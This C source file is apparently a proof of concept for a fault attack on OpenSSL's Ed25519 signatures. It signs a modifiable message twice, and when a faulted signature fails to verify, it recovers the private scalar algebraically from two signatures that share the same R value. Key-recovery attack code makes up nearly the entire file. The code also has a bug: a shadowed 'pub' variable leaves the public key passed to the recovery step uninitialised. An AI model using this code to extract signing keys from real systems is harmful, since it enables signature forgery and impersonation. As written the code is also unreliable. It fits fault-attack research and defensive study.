#include <stdio.h>
#include <stdint.h>
#include <gmp.h>

#include "openssl/conf.h"
#include "openssl/evp.h"
#include "openssl/err.h"
#include "openssl/pem.h"

// stdout logger
#ifdef ATCK_VERBOSE
	#define log(...) printf(__VA_ARGS__)
#else
	#define log(...)
#endif


#define SIGN_RUNS 2

static uint8_t kmsg[] 					= {1, 2, 3, 4};
static const uint8_t kmsg_original[] 	= {1, 2, 3, 4};
uint8_t sig[SIGN_RUNS][64];

// Function declarations
int sha512(mpz_t h, const mpz_t R, const mpz_t A, const uint8_t *m, const int m_len);
int recover_a(mpz_t a, const mpz_t A, const mpz_t R, const mpz_t s1, const mpz_t s2);


int recover_a(mpz_t a, const mpz_t A, const mpz_t R, const mpz_t s1, const mpz_t s2)
{
	log("\e[36m[ATCK] {ossl_ed25519_attack.c:recover_a()}: Recover secret a\e[39m\n");

#ifdef ATCK_VERBOSE
	gmp_printf("\e[36m[ATCK] {ossl_ed25519_attack.c:recover_a()}: R  = (%2d bytes) 0x%Zx\e[39m\n", mpz_size(R) * sizeof(uintptr_t), R);
	gmp_printf("\e[36m[ATCK] {ossl_ed25519_attack.c:recover_a()}: A  = (%2d bytes) 0x%Zx\e[39m\n", mpz_size(A) * sizeof(uintptr_t), A);
	gmp_printf("\e[36m[ATCK] {ossl_ed25519_attack.c:recover_a()}: s1 = (%2d bytes) 0x%Zx\e[39m\n", mpz_size(s1) * sizeof(uintptr_t), s1);
	gmp_printf("\e[36m[ATCK] {ossl_ed25519_attack.c:recover_a()}: s2 = (%2d bytes) 0x%Zx\e[39m\n", mpz_size(s2) * sizeof(uintptr_t), s2);
#endif

	// Compute hashes h1, h2
	mpz_t h1, h2, h, s, tmp, l;
	mpz_inits(h1, h2, h, s, tmp, l, NULL);
	if (!sha512(h1, R, A, kmsg_original, sizeof(kmsg_original))
		|| !sha512(h2, R, A, kmsg, sizeof(kmsg))) {
		puts("\e[31mError computing hashes!\e[39m\n");
		goto err;
	}
	
	// l = 2^252 + 27742317777372353535851937790883648493 (see Ed25519)
	mpz_set_str(tmp, "27742317777372353535851937790883648493", 10);
	mpz_ui_pow_ui(l, 2, 252);
	mpz_add(l, l, tmp);
	
	mpz_mod(h1, h1, l);
	mpz_mod(h2, h2, l);

#ifdef ATCK_VERBOSE
	gmp_printf("\e[36m[ATCK] {ossl_ed25519_attack.c:recover_a()}: l          = (%2d bytes) 0x%Zx\e[39m\n", mpz_size(l) * sizeof(uintptr_t), l);
	gmp_printf("\e[36m[ATCK] {ossl_ed25519_attack.c:recover_a()}: h1 (mod l) = (%2d bytes) 0x%Zx\e[39m\n", mpz_size(h1) * sizeof(uintptr_t), h1);
	gmp_printf("\e[36m[ATCK] {ossl_ed25519_attack.c:recover_a()}: h2 (mod l) = (%2d bytes) 0x%Zx\e[39m\n", mpz_size(h2) * sizeof(uintptr_t), h2);
#endif

	// recover secret a = (s1 - s2) / (h1 - h2)
	//                  = (s1 - s2) * (h1 - h2)^-1
	mpz_sub(h, h1, h2);
	mpz_mod(h, h, l);
	if (!mpz_invert(h, h, l)) {
		puts("\e[31mThere is no modular inverse of h!\e[39m\n");
		goto err;
	}
	mpz_sub(s, s1, s2);
	mpz_mod(s, s, l);
	mpz_mul(a, s, h);
	mpz_mod(a, a, l);
#ifdef ATCK_VERBOSE
	gmp_printf("\e[36m[ATCK] {ossl_ed25519_attack.c:recover_a()}: a = (%2d bytes) 0x%Zx\e[39m\n", mpz_size(a) * sizeof(uintptr_t), a);
#endif

	// Recreate signatures
	log("\e[36m[ATCK] {ossl_ed25519_attack.c:recover_a()}: Checking a\e[39m\n");
	// r = s - H()*a
	mpz_mul(h, h1, a);
	mpz_mod(h, h, l);
	mpz_sub(tmp, s1, h);
	mpz_mod(tmp, tmp, l);

	// s = (r + H()*a) mod l
	mpz_add(tmp, tmp, h);
	mpz_mod(tmp, tmp, l);

	if (mpz_cmp(s1, tmp) == 0)
		puts("\e[32mSecret a found.\e[39m");
	else
		puts("\e[31mCould not recreate signature.\e[39m");

	mpz_clears(h1, h2, h, s, tmp, l, NULL);
	return 1;

err:
	mpz_clears(h1, h2, h, s, tmp, l, NULL);
	return 0;
}

int sha512(mpz_t h, const mpz_t R, const mpz_t A, const uint8_t *m, const int m_len) 
{
	log("\e[36m[ATCK] {ossl_ed25519_attack.c:sha512()}: Computing SHA512\e[39m\n");
	
	uint8_t *a_R, *a_A;
	size_t a_R_len, a_A_len;

	a_R = mpz_export(NULL, &a_R_len, -1, sizeof(uint8_t), 0, 0, R);
	a_A = mpz_export(NULL, &a_A_len, -1, sizeof(uint8_t), 0, 0, A);

	// OpenSSL SHA512
	uint8_t a_h[SHA512_DIGEST_LENGTH];
	EVP_MD_CTX *hash_ctx;
	unsigned int h_len;

	if ((hash_ctx = EVP_MD_CTX_new()) == NULL)
		goto err;

	// Compute hash
	if (!EVP_DigestInit_ex(hash_ctx, EVP_sha512(), NULL)
		|| !EVP_DigestUpdate(hash_ctx, a_R, a_R_len)
		|| !EVP_DigestUpdate(hash_ctx, a_A, a_A_len)
		|| !EVP_DigestUpdate(hash_ctx, m, m_len)
		|| !EVP_DigestFinal_ex(hash_ctx, a_h, &h_len))
		goto err;

	mpz_import(h, h_len, -1, sizeof(uint8_t), 0, 0, a_h);

	EVP_MD_CTX_free(hash_ctx);
	free(a_R);
	free(a_A);
	return 1;

err:
	free(a_R);
	free(a_A);
	ERR_print_errors_fp(stderr);
	return 0;
}

int main(int arc, char *argv[])
{
	int ret;

	// Initialize the one and only crypto lib
	OPENSSL_init_crypto(0, NULL);
	OpenSSL_add_all_algorithms();

	// Load the human readable error strings for libcrypto
	ERR_load_crypto_strings();

	// Setup base64 encoder for printing to stdout
	// Doc: https://www.openssl.org/docs/man1.1.1/man3/BIO_f_base64.html
	BIO *b64 = BIO_new(BIO_f_base64());
	BIO *bio = BIO_new_fp(stdout, BIO_NOCLOSE);
	BIO_set_flags(b64, BIO_FLAGS_BASE64_NO_NL);
	BIO_push(b64, bio);

	EVP_PKEY *pkey = NULL;
	EVP_PKEY_CTX *pctx = NULL;
	EVP_MD_CTX  *mdctx = NULL;
	size_t sig_len = sizeof(sig[0]);

	uint8_t pub[32];
	size_t pub_len = sizeof(pub);
	
	// Generate keys
	// Doc: https://www.openssl.org/docs/man1.1.1/man7/Ed25519.html
	pctx = EVP_PKEY_CTX_new_id(EVP_PKEY_ED25519, NULL);
	if (!EVP_PKEY_keygen_init(pctx) ||
		!EVP_PKEY_keygen(pctx, &pkey))
		goto err;

	// Print public key
	puts("Raw Public key: (base64)");
	{
		uint8_t pub[32];
		size_t pub_len = sizeof(pub);
		EVP_PKEY_get_raw_public_key(pkey, pub, &pub_len);
		BIO_write(b64, pub, pub_len);
		BIO_flush(b64);
		puts("");
	}

	// Sign message
	// Doc: https://www.openssl.org/docs/man1.1.1/man3/EVP_DigestSignInit.html
	mdctx = EVP_MD_CTX_new();
	for (int sign_run = 0; sign_run < SIGN_RUNS; sign_run++) {
		if (!EVP_DigestSignInit(mdctx, &pctx, NULL, NULL, pkey))
		goto err;

		// One-shot-sign (update and final are not supported with Ed25519)
		log("\e[36m[ATCK] {ossl_ed25519_attack.c:main()}: Start Ed25519 sign\e[39m\n");
		if (!EVP_DigestSign(mdctx, sig[sign_run], &sig_len, kmsg, sizeof(kmsg)))
			goto err;
		log("\e[36m[ATCK] {ossl_ed25519_attack.c:main()}: End Ed25519 sign\e[39m\n");

		// Print signature
		puts("Raw signature: (base64)");
		BIO_write(b64, sig[sign_run], sig_len);
		BIO_flush(b64);
		puts("");

		// Check signature
		// Doc: https://www.openssl.org/docs/man1.1.1/man3/EVP_DigestVerifyInit.html
		if (!EVP_DigestVerifyInit(mdctx, &pctx, NULL, NULL, pkey))
			goto err;
		ret = EVP_DigestVerify(mdctx, sig[sign_run], sig_len, kmsg_original, sizeof(kmsg_original));
		if (ret == 1)
			puts("\e[32mSignature successfully verified.\e[39m");
		else if (ret == 0)
			puts("\e[31mSignature could not be verified.\e[39m");
		else
			goto err;
	}

	// Calculate secret a
	if (ret == 0 && SIGN_RUNS >= 2) {

		mpz_t A, R, s1, s2, a;
		mpz_inits(A, R, s1, s2, a, NULL);
		mpz_import(A, pub_len, -1, sizeof(pub[0]), 0, 0, pub);
		mpz_import(R, sig_len / 2, -1, sizeof(sig[0][0]), 0, 0, sig[0]);
		mpz_import(s1, sig_len / 2, -1, sizeof(sig[0][0]), 0, 0, sig[0] + 32);
		mpz_import(s2, sig_len / 2, -1, sizeof(sig[0][0]), 0, 0, sig[1] + 32);

		recover_a(a, A, R, s1, s2);
		gmp_printf("a = 0x%Zx (%d)\n", a, mpz_size(a) * sizeof(uintptr_t));

		mpz_clears(a, A, R, s1, s2, NULL);
	}
	
	// Free stuff
	BIO_free_all(b64);
	EVP_MD_CTX_free(mdctx);
	//EVP_PKEY_CTX_free(pctx); <- pctx became part of mdctx which is freed already

	// Removes all digests and ciphers
	EVP_cleanup();

	// if you omit the next, a small leak may be left when you make use of the BIO (low level API) for e.g. base64 transformations
	CRYPTO_cleanup_all_ex_data();

	// Remove error strings
	ERR_free_strings();

	return 0;

err:
	ERR_print_errors_fp(stderr);
	return 0;
}